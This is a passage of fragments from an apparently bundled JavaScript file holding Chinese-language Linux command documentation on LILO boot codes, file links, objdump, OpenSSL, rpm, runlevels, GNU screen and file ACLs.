都表示出现了问题：</p>\\n<p>L：第一阶段引导加载程序已经被加载。如果 LILO 停止在这里，那么是在引导第二阶段引导加载程序时出现了问题。这通常会伴随有一个错误代码。 在这个阶段的常见问题是介质问题，或者在 lilo.conf 文件中指定了不正确的磁盘参数。</p>\\n<p>LI：第二阶段引导加载程序已经被加载。LILO 在此处停止表示第二阶段引导加载程序不能被执行。同样，这可能是因为出现了与只显示 L 类似的问题： 正在加载，或者因 boot.b 文件被破坏、移动或删除而不能加载。</p>\\n<p>LIL：第二阶段引导加载程序正在被执行。此时，可能会再次出现介质问题，或者映射文件（如 lilo.conf 文件中所指定的）在寻找描述符表时 可能会出现问题。</p>\\n<p>LIL?：加载到与上面相同的阶段。这通常意味着加载第二阶段引导加载程序使用了错误的地址，最常见的原因是 boot.b 所在的位置与 lilo.conf 文件所指定的不同。</p>\\n<p>LIL-：加载到与上面相同的阶段。加载描述符表时出现问题，最常见的原因是描述符表错误。</p>\\n<p>LILO：LILO 成功被加载，没有出现任何错误。</p>\\n<p><strong>引导时的附加配置</strong></p>\\n<p>LILO 被成功加载后，将看到 LILO 提示符。还是使用前面的示例 lilo.conf 文件，此时将有两个选择，可能对 LILO 新手来说并不直观。首先，可以 让 LILO 超时（10 秒后），这将引导<code>/dev/hdb3</code>，即 Linux 分区。另外，可以按下 TAB 键，这将列出将要引导的操作系统选项。在我们的示例 lilo.conf 中， 将得到的选项是 “Linux” 和 “Windows”。输入哪一个，就会引导到哪个 OS。指定加载 Linux 选项，会提示输入一个口令，在本例中是 linux。如果输入的口令有误，则会返回 LILO 提示符。</p>\\n<p>不幸的是，LILO 不支持引导期间的交互式配置，所以，只能在 lilo.conf 中或者运行<code>/sbin/lilo</code>时指定选项。</p>\\n<p>关于第一次尝试 LILO 的最后一点建议是：我发现使用软盘引导磁盘比使用硬盘实现 LILO 配置更为安全。为此，必须在 lilo.conf 文件中使用<code>boot=/dev/fd0</code>替换<code>boot=/dev/hda</code>。那样，如果弄乱了lilo.conf文件 中的任何配置，都可以取出引导磁盘并像先前一样引导到 Linux。当使用软盘进行引导一切正常以后，可以将lilo.conf修改回<code>boot=/dev/hda</code>，然后最后一次运行<code>/sbin/lilo</code>来上传修改。</p>\\n\";\n\n/***/ }),\n/* 272 */\n/***/ (function(module, exports) {\n\nmodule.exports =

id=\\\"-\\\">扩展知识</h2>\\n<p>Linux具有为一个文件起多个名字的功能，称为链接。被链接的文件可以存放在相同的目录下，但是必须有不同的文件名，而不用在硬盘上为同样的数据重复备份。另外，被链接的文件也可以有相同的文件名，但是存放在不同的目录下，这样只要对一个目录下的该文件进行修改，就可以完成对所有目录下同名链接文件的修改。对于某个文件的各链接文件，我们可以给它们指定不同的存取权限，以控制对信息的共享和增强安全性。</p>\\n<p>文件链接有两种形式，即硬链接和符号链接。</p>\\n<h3 id=\\\"-\\\">硬链接</h3>\\n<p>建立硬链接时，在另外的目录或本目录中增加目标文件的一个目录项，这样，一个文件就登记在多个目录中。如图所示的m2.c文件就在目录mub1和liu中都建立了目录项。</p>\\n<p>创建硬链接后，己经存在的文件的I节点号（Inode）会被多个目录文件项使用。一个文件的硬链接数可以在目录的长列表格式的第二列中看到，无额外链接的文件的链接数为l。</p>\\n<p>在默认情况下，ln命令创建硬链接。ln命令会增加链接数，<a href=\\\"https://philipding.github.io/linux-command/rm\\\" title=\\\"rm命令\\\">rm</a>命令会减少链接数。一个文件除非链接数为0，否则不会从文件系统中被物理地删除。</p>\\n<p>对硬链接有如下限制：</p>\\n<ul>\\n<li>不能对目录文件做硬链接。</li>\\n<li>不能在不同的文件系统之间做硬链接。就是说，链接文件和被链接文件必须位于同一个文件系统中。</li>\\n</ul>\\n<h3 id=\\\"-\\\">符号链接</h3>\\n<p>符号链接也称为软链接，是将一个路径名链接到一个文件。这些文件是一种特别类型的文件。事实上，它只是一个文本文件（如图中的abc文件），其中包含它提供链接的另一个文件的路径名，如图中虚线箭头所示。另一个文件是实际包含所有数据的文件。所有读、写文件内容的命令被用于符号链接时，将沿着链接方向前进来访问实际的文件。</p>\\n<p><img src=\\\"https://philipding.github.io/linux-command/wp-content/uploads/2013/11/ln.jpg\\\" alt=\\\"符号连接\\\"></p>\\n<p>与硬链接不同的是，符号链接确实是一个新文件，当然它具有不同的I节点号；而硬链接并没有建立新文件。</p>\\n<p>符号链接没有硬链接的限制，可以对目录文件做符号链接，也可以在不同文件系统之间做符号链接。</p>\\n<p>用<code>ln -s</code>命令建立符号链接时，源文件最好用绝对路径名。这样可以在任何工作目录下进行符号链接。而当源文件用相对路径时，如果当前的工作路径与要创建的符号链接文件所在路径不同，就不能进行链接。</p>\\n<p>符号链接保持了链接与源文件或目录之间的区别：</p>\\n<ul>\\n<li>删除源文件或目录，只删除了数据，不会删除链接。一旦以同样文件名创建了源文件，链接将继续指向该文件的新数据。</li>\\n<li>在目录长列表中，符号链接作为一种特殊的文件类型显示出来，其第一个字母是l。</li>\\n<li>符号链接的大小是其链接文件的路径名中的字节数。</li>\\n<li>当用<code>ln -s</code>命令列出文件时，可以看到符号链接名后有一个箭头指向源文件或目录，例如<code>lrwxrwxrwx … 14 jun 20 10:20 /etc/motd-&gt;/original_file</code>其中，表示“文件大小”的数字“14”恰好说明源文件名<code>original_file</code>由14个字符构成。</li>\\n</ul>\\n\";\n\n/***/ }),\n/* 273 */\n/***/ (function(module, exports) {\n\nmodule.exports =

个设备号又分为主设备号和次设备号。主设备号用来区分不同种类的设备，而次设备号用来区分同一类型的多个设备。对于常用设备，Linux有约定俗成的编 号，如硬盘的主设备号是3。</p>\\n<p>Linux为所有的设备文件都提供了统一的操作函数接口，方法是使用数据结构struct file_operations。这个数据结构中包括许多操作函数的指针，如open()、close()、<a href=\\\"https://philipding.github.io/linux-command/read\\\" title=\\\"read命令\\\">read</a>()和<a href=\\\"https://philipding.github.io/linux-command/write\\\" title=\\\"write命令\\\">write</a>()等，但由于外设 的种类较多，操作方式各不相同。Struct file_operations结构体中的成员为一系列的接口函数，如用于读/写的read/write函数和用于控制的ioctl等。</p>\\n<p>打开一个文件就是调用这个文件file_operations中的open操作。不同类型的文件有不同的file_operations成员函数，如普通的磁盘数据文件， 接口函数完成磁盘数据块读写操作；而对于各种设备文件，则最终调用各自驱动程序中的I/O函数进行具体设备的操作。这样，应用程序根本不必考虑操作的是设 备还是普通文件，可一律当作文件处理，具有非常清晰统一的I/O接口。所以file_operations是文件层次的I/O接口。</p>\\n\";\n\n/***/ }),\n/* 322 */\n/***/ (function(module,

\\n指定目标码格式。这不是必须的，objdump能自动识别许多格式，比如： \\n\\nobjdump -b oasys -m vax -h fu.o \\n显示fu.o的头部摘要信息，明确指出该文件是Vax系统下用Oasys编译器生成的目标文件。objdump -i将给出这里可以指定的目标码格式列表。 \\n\\n-C \\n--demangle \\n将底层的符号名解码成用户级名字，除了去掉所开头的下划线之外，还使得C++函数名以可理解的方式显示出来。 \\n\\n--debugging \\n-g \\n显示调试信息。企图解析保存在文件中的调试信息并以C语言的语法显示出来。仅仅支持某些类型的调试信息。有些其他的格式被[readelf](https://philipding.github.io/linux-command/readelf &quot;readelf命令&quot;) -[w](https://philipding.github.io/linux-command/w &quot;w命令&quot;)支持。 \\n\\n-e \\n--debugging-tags \\n类似-g选项，但是生成的信息是和ctags工具相兼容的格式。 \\n\\n--disassemble \\n-d \\n从objfile中反汇编那些特定指令机器码的section。 \\n\\n-D \\n--disassemble-all \\n与 -d 类似，但反汇编所有section. \\n\\n--prefix-addresses \\n反汇编的时候，显示每一行的完整地址。这是一种比较老的反汇编格式。 \\n\\n-EB \\n-EL \\n--endian={big|little} \\n指定目标文件的小端。这个项将影响反汇编出来的指令。在反汇编的文件没描述小端信息的时候用。例如S-records. \\n\\n-f \\n--[file](https://philipding.github.io/linux-command/file &quot;file命令&quot;)-headers \\n显示objfile中每个文件的整体头部摘要信息。 \\n\\n-h

\\n用文件名和行号标注相应的目标代码，仅仅和-d、-D或者-r一起使用使用-[ld](https://philipding.github.io/linux-command/ld &quot;ld命令&quot;)和使用-d的区别不是很大，在源码级调试的时候有用，要求编译时使用了-g之类的调试编译选项。 \\n\\n-m machine \\n--architecture=machine \\n指定反汇编目标文件时使用的架构，当待反汇编文件本身没描述架构信息的时候(比如S-records)，这个选项很有用。可以用-i选项列出这里能够指定的架构. \\n\\n--reloc \\n-r \\n显示文件的重定位入口。如果和-d或者-D一起使用，重定位部分以反汇编后的格式显示出来。 \\n\\n--dynamic-reloc \\n-R \\n显示文件的动态重定位入口，仅仅对于动态目标文件意义，比如某些共享库。 \\n\\n-s \\n--full-contents \\n显示指定section的完整内容。默认所有的非空section都会被显示。 \\n\\n-S \\n--source \\n尽可能反汇编出源代码，尤其当编译的时候指定了-g这种调试参数时，效果比较明显。隐含了-d参数。 \\n\\n--show-raw-insn \\n反汇编的时候，显示每条汇编指令对应的机器码，如不指定--prefix-addresses，这将是缺省选项。 \\n\\n--no-show-raw-insn \\n反汇编时，不显示汇编指令的机器码，如不指定--prefix-addresses，这将是缺省选项。 \\n\\n--start-address=address \\n从指定地址开始显示数据，该选项影响-d、-r和-s选项的输出。 \\n\\n--stop-address=address \\n显示数据直到指定地址为止，该项影响-d、-r和-s选项的输出。 \\n\\n-t \\n--syms \\n显示文件的符号表入口。类似于[nm](https://philipding.github.io/linux-command/nm &quot;nm命令&quot;) -s提供的信息 \\n\\n-T \\n--dynamic-syms \\n显示文件的动态符号表入口，仅仅对动态目标文件意义，比如某些共享库。它显示的信息类似于 nm -D|--dynamic 显示的信息。 \\n\\n-V \\n--version \\n版本信息 \\n\\n--all-headers \\n-x \\n显示所可用的头信息，包括符号表、重定位入口。-x 等价于-a -f -h -r -t 同时指定。 \\n\\n-z \\n--disassemble-zeroes \\n一般反汇编输出将省略大块的零，该选项使得这些零块也被反汇编。 \\n\\n@file 可以将选项集中到一个文件中，然后使用这个@file选项载入。\\n</code></pre><h3 id=\\\"-\\\">实例</h3>\\n<p>首先，在给出后面大部分测试所基于的源代码以及编译指令。 源代码如下：

\"<p><strong>OpenSSL</strong>是一个强大的安全套接字层密码库，囊括主要的密码算法、常用的密钥和证书封装管理功能及SSL协议，并提供丰富的应用程序供测试或其它目的使用。在OpenSSL被曝出现严重安全漏洞后，发现多数通过SSL协议加密的网站使用名为OpenSSL的开源软件包。由于这是互联网应用最广泛的安全传输方法，被网银、在线支付、电商网站、门户网站、电子邮件等重要网站广泛使用，所以该漏洞影响范围广大。</p>\\n<p>OpenSSL有两种运行模式：交互模式和批处理模式。</p>\\n<p>直接输入openssl回车进入交互模式，输入带命令选项的openssl进入批处理模式。</p>\\n<p>OpenSSL整个软件包大概可以分成三个主要的功能部分：密码算法库、SSL协议库以及应用程序。OpenSSL的目录结构自然也是围绕这三个功能部分进行规划的。 </p>\\n<p><strong>对称加密算法</strong></p>\\n<p>OpenSSL一共提供了8种对称加密算法，其中7种是分组加密算法，仅有的一种流加密算法是RC4。这7种分组加密算法分别是AES、DES、Blowfish、CAST、IDEA、RC2、RC5，都支持电子密码本模式（ECB）、加密分组链接模式（CBC）、加密反馈模式（CFB）和输出反馈模式（OFB）四种常用的分组密码加密模式。其中，AES使用的加密反馈模式（CFB）和输出反馈模式（OFB）分组长度是128位，其它算法使用的则是64位。事实上，DES算法里面不仅仅是常用的DES算法，还支持三个密钥和两个密钥3DES算法。 </p>\\n<p><strong>非对称加密算法</strong></p>\\n<p>OpenSSL一共实现了4种非对称加密算法，包括DH算法、RSA算法、DSA算法和椭圆曲线算法（EC）。DH算法一般用户密钥交换。RSA算法既可以用于密钥交换，也可以用于数字签名，当然，如果你能够忍受其缓慢的速度，那么也可以用于数据加密。DSA算法则一般只用于数字签名。 </p>\\n<p><strong>信息摘要算法</strong></p>\\n<p>OpenSSL实现了5种信息摘要算法，分别是MD2、MD5、MDC2、SHA（SHA1）和RIPEMD。SHA算法事实上包括了SHA和SHA1两种信息摘要算法，此外，OpenSSL还实现了DSS标准中规定的两种信息摘要算法DSS和DSS1。 </p>\\n<p><strong>密钥和证书管理</strong></p>\\n<p>密钥和证书管理是PKI的一个重要组成部分，OpenSSL为之提供了丰富的功能，支持多种标准。 </p>\\n<p>首先，OpenSSL实现了ASN.1的证书和密钥相关标准，提供了对证书、公钥、私钥、证书请求以及CRL等数据对象的DER、PEM和BASE64的编解码功能。OpenSSL提供了产生各种公开密钥对和对称密钥的方法、函数和应用程序，同时提供了对公钥和私钥的DER编解码功能。并实现了私钥的PKCS#12和PKCS#8的编解码功能。OpenSSL在标准中提供了对私钥的加密保护功能，使得密钥可以安全地进行存储和分发。 </p>\\n<p>在此基础上，OpenSSL实现了对证书的X.509标准编解码、PKCS#12格式的编解码以及PKCS#7的编解码功能。并提供了一种文本数据库，支持证书的管理功能，包括证书密钥产生、请求产生、证书签发、吊销和验证等功能。 </p>\\n<p>事实上，OpenSSL提供的CA应用程序就是一个小型的证书管理中心（CA），实现了证书签发的整个流程和证书管理的大部分机制。</p>\\n<h3 id=\\\"-\\\">实例</h3>\\n<p><strong>1、消息摘要算法应用例子</strong></p>\\n<p>用SHA1算法计算文件<a

your-package.rpm\\n</code></pre><p>其中your-package.rpm是你要安装的rpm包的文件名，一般置于当前目录下。</p>\\n<p>安装过程中可能出现下面的警告或者提示：</p>\\n<pre><code>... conflict with ...\\n</code></pre><p>可能是要安装的包里有一些文件可能会覆盖现有的文件，缺省时这样的情况下是无法正确安装的可以用<code>rpm --force -i</code>强制安装即可</p>\\n<pre><code>... is needed by ...\\n... is not installed ...\\n</code></pre><p>此包需要的一些软件你没有安装可以用<code>rpm --nodeps -i</code>来忽略此信息，也就是说<code>rpm -i --force --nodeps</code>可以忽略所有依赖关系和文件问题，什么包都能安装上，但这种强制安装的软件包不能保证完全发挥功能。</p>\\n<p><strong>如何安装.src.rpm软件包</strong></p>\\n<p>有些软件包是以.src.rpm结尾的，这类软件包是包含了源代码的rpm包，在安装时需要进行编译。这类软件包有两种安装方法：</p>\\n<p>方法一：</p>\\n<pre><code>rpm -i your-package.src.rpm\\n[cd](https://philipding.github.io/linux-command/cd &quot;cd命令&quot;) /usr/src/redhat/SPECS\\n[rpmbuild](https://philipding.github.io/linux-command/rpmbuild &quot;rpmbuild命令&quot;) -bp your-package.specs             #一个和你的软件包同名的specs文件\\ncd /usr/src/redhat/BUILD/your-package/      #一个和你的软件包同名的目录\\n./configure                                 #这一步和编译普通的源码软件一样，可以加上参数\\n[make](https://philipding.github.io/linux-command/make &quot;make命令&quot;)\\nmake install\\n</code></pre><p>方法二：</p>\\n<pre><code>rpm -i you-package.src.rpm\\ncd /usr/src/redhat/SPECS\\n</code></pre><p>前两步和方法一相同</p>\\n<pre><code>rpmbuild -bb your-package.specs       #一个和你的软件包同名的specs文件\\n</code></pre><p>这时在<code>/usr/src/redhat/RPM/i386/</code>（根据具体包的不同，也可能是i686,noarch等等）在这个目录下，有一个新的rpm包，这个是编译好的二进制文件。</p>\\n<p>执行<code>rpm -i new-package.rpm</code>即可安装完成。</p>\\n<p><strong>如何卸载rpm软件包</strong></p>\\n<p>使用命令<code>rpm -e</code>包名，包名可以包含版本号等信息，但是不可以有后缀.rpm，比如卸载软件包proftpd-1.2.8-1，可以使用下列格式：</p>\\n<pre><code>rpm -e proftpd-1.2.8-1\\nrpm -e proftpd-1.2.8\\nrpm -e proftpd-\\nrpm -e proftpd\\n</code></pre><p>不可以是下列格式：</p>\\n<pre><code>rpm -e proftpd-1.2.8-1.i386.rpm\\nrpm -e proftpd-1.2.8-1.i386\\nrpm -e proftpd-1.2\\nrpm -e proftpd-1\\n</code></pre><p>有时会出现一些错误或者警告：</p>\\n<pre><code>... is needed by ...\\n</code></pre><p>这说明这个软件被其他软件需要，不能随便卸载，可以用rpm -e --nodeps强制卸载</p>\\n<p><strong>如何不安装但是获取rpm包中的文件</strong></p>\\n<p>使用工具<a href=\\\"https://philipding.github.io/linux-command/rpm2cpio\\\" title=\\\"rpm2cpio命令\\\">rpm2cpio</a>和<a href=\\\"https://philipding.github.io/linux-command/cpio\\\" title=\\\"cpio命令\\\">cpio</a></p>\\n<pre><code>rpm2cpio xxx.rpm | cpio -[vi](https://philipding.github.io/linux-command/vi &quot;vi命令&quot;)\\nrpm2cpio xxx.rpm | cpio -idmv\\nrpm2cpio xxx.rpm | cpio --extract --make-directories\\n</code></pre><p>参数i和extract相同，表示提取文件。v表示指示执行进程，d和make-directory相同，表示根据包中文件原来的路径建立目录，m表示保持文件的更新时间。</p>\\n<p><strong>如何查看与rpm包相关的文件和其他信息</strong></p>\\n<p>下面所有的例子都假设使用软件包<a href=\\\"https://philipding.github.io/linux-command/mysql\\\" title=\\\"mysql命令\\\">mysql</a>-3.23.54a-11</p>\\n<p>1、我的系统中安装了那些rpm软件包。</p>\\n<pre><code>rpm -qa

sql\\n</code></pre><p>2、如何获得某个软件包的文件全名。</p>\\n<pre><code>rpm -q mysql\\n</code></pre><p>可以获得系统中安装的mysql软件包全名，从中可以获得当前软件包的版本等信息。这个例子中可以得到信息mysql-3.23.54a-11</p>\\n<p>3、一个rpm包中的文件安装到那里去了？</p>\\n<pre><code>rpm -ql 包名\\n</code></pre><p>注意这里的是不包括.rpm后缀的软件包的名称，也就是说只能用mysql或者mysql-3.23.54a-11而不是mysql-3.23.54a-11.rpm。如果只是想知道可执行程序放到那里去了，也可以用<a href=\\\"https://philipding.github.io/linux-command/which\\\" title=\\\"which命令\\\">which</a>，比如：</p>\\n<pre><code>which mysql\\n</code></pre><p>4、一个rpm包中包含那些文件。</p>\\n<ul>\\n<li>一个没有安装过的软件包，使用<code>rpm -qlp ****.rpm</code></li>\\n<li>一个已经安装过的软件包，还可以使用<code>rpm -ql ****.rpm</code></li>\\n</ul>\\n<p>5、如何获取关于一个软件包的版本，用途等相关信息？</p>\\n<ul>\\n<li>一个没有安装过的软件包，使用<code>rpm -qip ****.rpm</code></li>\\n<li>一个已经安装过的软件包，还可以使用<code>rpm -qi ****.rpm</code></li>\\n</ul>\\n<p>6、某个程序是哪个软件包安装的，或者哪个软件包包含这个程序。</p>\\n<pre><code>rpm -qf `which 程序名`    #返回软件包的全名\\nrpm -qif `which 程序名`   #返回软件包的有关信息\\nrpm -qlf `which 程序名`   #返回软件包的文件列表\\n</code></pre><p>注意，这里不是引号，而是<code>，就是键盘左上角的那个键。也可以使用</code>rpm -qilf`，同时输出软件包信息和文件列表。</p>\\n<p>7、某个文件是哪个软件包安装的，或者哪个软件包包含这个文件。</p>\\n<p>注意，前一个问题中的方法，只适用与可执行的程序，而下面的方法，不仅可以用于可执行程序，也可以用于普通的任何文件。前提是知道这个文件名。首先获得这个程序的完整路径，可以用<a href=\\\"https://philipding.github.io/linux-command/whereis\\\" title=\\\"whereis命令\\\">whereis</a>或者which，然后使用<code>rpm -qf</code>例如：</p>\\n<pre><code>whereis

href=\\\"https://philipding.github.io/linux-command/command\\\" title=\\\"command命令\\\">command</a> prompt only。进入每个runlevel都需要启动或关闭相应的一系列服务(services)，这些服务(services)以初始化脚本的方式放置于目录<code>/etc/rc.d/rc?.d/</code>或者<code>/etc/rc?.d</code>下面（?代表runlevel的对应序号）。</p>\\n<p>在大多数的linux发行版本中，通常有8个runlevel：</p>\\n<pre><code>0

1和2除了调试之外很少使用，runlevel s和S并不是直接给用户使用，而是用来为Single user mode作准备。</p>\\n<p>linux的运行模式比起windows的启动模式的优势在于：你可以在系统空闲时使用<a href=\\\"https://philipding.github.io/linux-command/init\\\"

[yum](https://philipding.github.io/linux-command/yum &quot;yum命令&quot;) [install](https://philipding.github.io/linux-command/install &quot;install命令&quot;) screen\\n[root@TS-DEV ~]#

~]#\\n</code></pre><p><strong>创建一个新的窗口</strong></p>\\n<p>安装完成后，直接敲命令screen就可以启动它。但是这样启动的screen会话没有名字，实践上推荐为每个screen会话取一个名字，方便分辨：</p>\\n<pre><code>[root@TS-DEV ~]# screen -S david\\n</code></pre><p>screen启动后，会创建第一个窗口，也就是窗口No. 0，并在其中打开一个系统默认的shell，一般都会是bash。所以你敲入命令screen之后，会立刻又返回到命令提示符，仿佛什么也没有发生似的，其实你已经进入Screen的世界了。当然，也可以在screen命令之后加入你喜欢的参数，使之直接打开你指定的程序，例如：</p>\\n<pre><code>[root@TS-DEV ~]# screen vi david.txt\\n</code></pre><p>screen创建一个执行vi david.txt的单窗口会话，退出vi 将退出该窗口/会话。</p>\\n<p><strong>查看窗口和窗口名称</strong></p>\\n<p>打开多个窗口后，可以使用快捷键C-a w列出当前所有窗口。如果使用文本终端，这个列表会列在屏幕左下角，如果使用X环境下的终端模拟器，这个列表会列在标题栏里。窗口列表的样子一般是这样：</p>\\n<pre><code>0$ bash  1-$ bash  2*$ bash\\n</code></pre><p>这个例子中我开启了三个窗口，其中*号表示当前位于窗口2，-号表示上一次切换窗口时位于窗口1。</p>\\n<p>Screen默认会为窗口命名为编号和窗口中运行程序名的组合，上面的例子中窗口都是默认名字。练习了上面查看窗口的方法，你可能就希望各个窗口可以有不同的名字以方便区分了。可以使用快捷键C-a A来为当前窗口重命名，按下快捷键后，Screen会允许你为当前窗口输入新的名字，回车确认。</p>\\n<p><strong>会话分离与恢复</strong></p>\\n<p>你可以不中断screen窗口中程序的运行而暂时断开（detach）screen会话，并在随后时间重新连接（attach）该会话，重新控制各窗口中运行的程序。例如，我们打开一个screen窗口编辑/tmp/david.txt文件：</p>\\n<pre><code>[root@TS-DEV ~]# screen vi /tmp/david.txt\\n</code></pre><p>之后我们想暂时退出做点别的事情，比如出去散散步，那么在screen窗口键入C-a d，Screen会给出detached提示：</p>\\n<p>暂时中断会话</p>\\n<p><img src=\\\"https://philipding.github.io/linux-command/wp-content/uploads/2015/12/105052iyv.jpg\\\" alt=\\\"\\\"></p>\\n<p>半个小时之后回来了，找到该screen会话：</p>\\n<pre><code>[root@TS-DEV ~]# screen -ls\\n</code></pre><p><img src=\\\"https://philipding.github.io/linux-command/wp-content/uploads/2015/12/1050524wP.jpg\\\" alt=\\\"\\\"></p>\\n<p>重新连接会话：</p>\\n<pre><code>[root@TS-DEV ~]# screen -r 12865\\n</code></pre><p>一切都在。</p>\\n<p>当然，如果你在另一台机器上没有分离一个Screen会话，就无从恢复会话了。这时可以使用下面命令强制将这个会话从它所在的终端分离，转移到新的终端上来：</p>\\n<p><img src=\\\"https://philipding.github.io/linux-command/wp-content/uploads/2015/12/1050528Fl.jpg\\\" alt=\\\"\\\"></p>\\n<p><strong>清除dead 会话</strong></p>\\n<p>如果由于某种原因其中一个会话死掉了（例如人为杀掉该会话），这时screen -list会显示该会话为dead状态。使用screen -wipe命令清除该会话：</p>\\n<p><img src=\\\"https://philipding.github.io/linux-command/wp-content/uploads/2015/12/105053LNE.jpg\\\" alt=\\\"\\\"></p>\\n<p><strong>关闭或杀死窗口</strong></p>\\n<p>正常情况下，当你退出一个窗口中最后一个程序（通常是bash）后，这个窗口就关闭了。另一个关闭窗口的方法是使用C-a k，这个快捷键杀死当前的窗口，同时也将杀死这个窗口中正在运行的进程。</p>\\n<p>如果一个Screen会话中最后一个窗口被关闭了，那么整个Screen会话也就退出了，screen进程会被终止。</p>\\n<p>除了依次退出/杀死当前Screen会话中所有窗口这种方法之外，还可以使用快捷键C-a :，然后输入quit命令退出Screen会话。需要注意的是，这样退出会杀死所有窗口并退出其中运行的所有程序。其实C-a :这个快捷键允许用户直接输入的命令有很多，包括分屏可以输入<a href=\\\"https://philipding.github.io/linux-command/split\\\" title=\\\"split命令\\\">split</a>等，这也是实现Screen功能的一个途径，不过个人认为还是快捷键比较方便些。</p>\\n<h3 id=\\\"screen-\\\">screen 高级应用</h3>\\n<p><strong>会话共享</strong></p>\\n<p>还有一种比较好玩的会话恢复，可以实现会话共享。假设你在和朋友在不同地点以相同用户登录一台机器，然后你创建一个screen会话，你朋友可以在他的终端上命令：</p>\\n<pre><code>[root@TS-DEV ~]# screen -x\\n</code></pre><p>这个命令会将你朋友的终端Attach到你的Screen会话上，并且你的终端不会被Detach。这样你就可以和朋友共享同一个会话了，如果你们当前又处于同一个窗口，那就相当于坐在同一个显示器前面，你的操作会同步演示给你朋友，你朋友的操作也会同步演示给你。当然，如果你们切换到这个会话的不同窗口中去，那还是可以分别进行不同的操作的。</p>\\n<p><strong>会话锁定与解锁</strong></p>\\n<p>Screen允许使用快捷键C-a s锁定会话。锁定以后，再进行任何输入屏幕都不会再有反应了。但是要注意虽然屏幕上看不到反应，但你的输入都会被Screen中的进程接收到。快捷键C-a q可以解锁一个会话。</p>\\n<p>也可以使用C-a x锁定会话，不同的是这样锁定之后，会话会被Screen所属用户的密码保护，需要输入密码才能继续访问这个会话。</p>\\n<p><strong>发送命令到screen会话</strong></p>\\n<p>在Screen会话之外，可以通过screen命令操作一个Screen会话，这也为使用Screen作为脚本程序增加了便利。关于Screen在脚本中的应用超出了入门的范围，这里只看一个例子，体会一下在会话之外对Screen的操作：</p>\\n<pre><code>[root@TS-DEV ~]# screen -S sandy -X screen [ping](https://philipding.github.io/linux-command/ping &quot;ping命令&quot;) www.baidu.com\\n</code></pre><p>这个命令在一个叫做sandy的screen会话中创建一个新窗口，并在其中运行ping命令。</p>\\n<p><strong>屏幕分割</strong></p>\\n<p>现在显示器那么大，将一个屏幕分割成不同区域显示不同的Screen窗口显然是个很酷的事情。可以使用快捷键C-a S将显示器水平分割，Screen 4.00.03版本以后，也支持垂直分屏，快捷键是C-a |。分屏以后，可以使用C-a <tab>在各个区块间切换，每一区块上都可以创建窗口并在其中运行进程。</p>\\n<p>可以用C-a X快捷键关闭当前焦点所在的屏幕区块，也可以用C-a Q关闭除当前区块之外其他的所有区块。关闭的区块中的窗口并不会关闭，还可以通过窗口切换找到它。</p>\\n<p><img src=\\\"https://philipding.github.io/linux-command/wp-content/uploads/2015/12/1050538zX.jpg\\\" alt=\\\"\\\"></p>\\n<p><strong>C/P模式和操作</strong></p>\\n<p>screen的另一个很强大的功能就是可以在不同窗口之间进行复制粘贴了。使用快捷键C-a <Esc>或者C-a [可以进入copy/paste模式，这个模式下可以像在vi中一样移动光标，并可以使用空格键设置标记。其实在这个模式下有很多类似vi的操作，譬如使用/进行搜索，使用y快速标记一行，使用w快速标记一个单词等。关于C/P模式下的高级操作，其文档的这一部分有比较详细的说明。</p>\\n<p>一般情况下，可以移动光标到指定位置，按下空格设置一个开头标记，然后移动光标到结尾位置，按下空格设置第二个标记，同时会将两个标记之间的部分储存在copy/paste buffer中，并退出copy/paste模式。在正常模式下，可以使用快捷键C-a ]将储存在buffer中的内容粘贴到当前窗口。</p>\\n<p><img src=\\\"https://philipding.github.io/linux-command/wp-content/uploads/2015/12/105054so0.jpg\\\" alt=\\\"\\\"></p>\\n<p><strong>更多screen功能</strong></p>\\n<p>同大多数UNIX程序一样，GNU Screen提供了丰富强大的定制功能。你可以在Screen的默认两级配置文件/etc/screenrc和$HOME/.screenrc中指定更多，例如设定screen选项，定制绑定键，设定screen会话自启动窗口，启用多用户模式，定制用户访问权限控制等等。如果你愿意的话，也可以自己指定screen配置文件。</p>\\n<p>以多用户功能为例，screen默认是以单用户模式运行的，你需要在配置文件中指定multiuser on 来打开多用户模式，通过acl*（acladd,acldel,aclchg...）命令，你可以灵活配置其他用户访问你的screen会话。更多配置文件内容请参考screen的<a href=\\\"https://philipding.github.io/linux-command/man\\\" title=\\\"man命令\\\">man</a>页。</p>\\n\";\n\n/***/

href=\\\"https://philipding.github.io/linux-command/man\\\" title=\\\"man命令\\\">man</a> page上摘下来虽然有些枯燥,但是对于理解下面的内容还是很有帮助的。</p>\\n<p>ACL是由一系列的Access Entry所组成的，每一条Access Entry定义了特定的类别可以对文件拥有的操作权限。Access Entry有三个组成部分：Entry tag <a href=\\\"https://philipding.github.io/linux-command/type\\\" title=\\\"type命令\\\">type</a>, qualifier (optional), permission。</p>\\n<p>我们先来看一下最重要的Entry tag type，它有以下几个类型：</p>\\n<pre><code>ACL_USER_OBJ：相当于Linux里file_owner的permission\\nACL_USER：定义了额外的用户可以对此文件拥有的permission\\nACL_GROUP_OBJ：相当于Linux里group的permission\\nACL_GROUP：定义了额外的组可以对此文件拥有的permission\\nACL_MASK：定义了ACL_USER, ACL_GROUP_OBJ和ACL_GROUP的最大权限 (这个我下面还会专门讨论)\\nACL_OTHER：相当于Linux里other的permission\\n</code></pre><p>让我们来据个例子说明一下，下面我们就用getfacl命令来查看一个定义好了的ACL文件：</p>\\n<pre><code>[root@localhost ~]# getfacl ./test.txt\\n# file: test.txt\\n# owner: root\\n# group: admin\\nuser::rw-\\nuser:john:rw-\\ngroup::rw-\\ngroup:dev:r--\\nmask::rw- other::r--\\n</code></pre><p>前面三个以#开头的定义了文件名，file owner和group。这些信息没有太大的作用，接下来我们可以用<code>--omit-header</code>来省略掉。</p>\\n<pre><code>user::rw-       定义了ACL_USER_OBJ, 说明file owner拥有[read](https://philipding.github.io/linux-command/read &quot;read命令&quot;) and [write](https://philipding.github.io/linux-command/write &quot;write命令&quot;) permission\\nuser:john:rw-   定义了ACL_USER,这样用户john就拥有了对文件的读写权限,实现了我们一开始要达到的目的\\ngroup::rw-      定义了ACL_GROUP_OBJ,说明文件的group拥有read and write permission\\ngroup:dev:r--   定义了ACL_GROUP,使得dev组拥有了对文件的read permission\\nmask::rw-       定义了ACL_MASK的权限为read and write\\nother::r--      定义了ACL_OTHER的权限为read\\n</code></pre><p>从这里我们就可以看出ACL提供了我们可以定义特定用户和用户组的功能，那么接下来我们就来看一下如何设置一个文件的ACL：</p>\\n<p><strong>如何设置ACL文件</strong></p>\\n<p>首先我们还是要讲一下设置ACL文件的格式，从上面的例子中我们可以看到每一个Access Entry都是由三个被：号分隔开的字段所组成，第一个就是Entry tag type。</p>\\n<pre><code>user   对应了ACL_USER_OBJ和ACL_USER\\ngroup  